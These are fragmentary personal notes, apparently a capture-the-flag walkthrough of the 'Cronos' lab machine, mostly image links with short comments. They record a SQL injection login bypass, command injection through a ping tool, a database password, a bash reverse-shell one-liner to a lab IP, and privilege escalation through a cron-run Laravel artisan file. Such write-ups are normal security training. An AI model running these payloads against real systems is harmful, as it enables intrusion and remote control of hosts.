![image 124.png](assets/Cronos/image%20124.png)
  
![image 1 90.png](assets/Cronos/image%201%2090.png)
  
![image 2 89.png](assets/Cronos/image%202%2089.png)
  
![image 3 82.png](assets/Cronos/image%203%2082.png)
  
![image 4 78.png](assets/Cronos/image%204%2078.png)
  
![image 5 77.png](assets/Cronos/image%205%2077.png)
  
was able to log in with ‘ or 1=1— -
![image 6 73.png](assets/Cronos/image%206%2073.png)
  
![image 7 70.png](assets/Cronos/image%207%2070.png)
able to ping myself
  
![image 8 66.png](assets/Cronos/image%208%2066.png)
documentation hyper link leads to laravel docs
  
![image 9 63.png](assets/Cronos/image%209%2063.png)
  
![image 10 53.png](assets/Cronos/image%2010%2053.png)
Net Tool v0.1
[https://www.exploit-db.com/exploits/1695](https://www.exploit-db.com/exploits/1695)
  
  
![image 11 50.png](assets/Cronos/image%2011%2050.png)
can do command injection myself
  
![image 12 43.png](assets/Cronos/image%2012%2043.png)
user is noulis
  
![image 13 43.png](assets/Cronos/image%2013%2043.png)
databse password: kEjdbRigfBHUREiNSDs
  
![image 14 40.png](assets/Cronos/image%2014%2040.png)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/7778 0>&1’
- url encode
  
![image 15 37.png](assets/Cronos/image%2015%2037.png)
better screenshot of db config
  
![image 16 33.png](assets/Cronos/image%2016%2033.png)
admin password
  
![image 17 27.png](assets/Cronos/image%2017%2027.png)
cron tab for /var/www/laravel/artisan
- need to run something with php
  
  
  
![image 18 25.png](assets/Cronos/image%2018%2025.png)
1327663704
  
![image 19 23.png](assets/Cronos/image%2019%2023.png)
no laravel database, admin database only has one user with password already cracked
  
artisan runs every minute and we can edit it
![image 20 20.png](assets/Cronos/image%2020%2020.png)
  
![image 21 20.png](assets/Cronos/image%2021%2020.png)
  
the cron job is running the php file, and we are free to change it how we want
![image 22 17.png](assets/Cronos/image%2022%2017.png)
  
![image 23 14.png](assets/Cronos/image%2023%2014.png)
after the scheduled minute it runs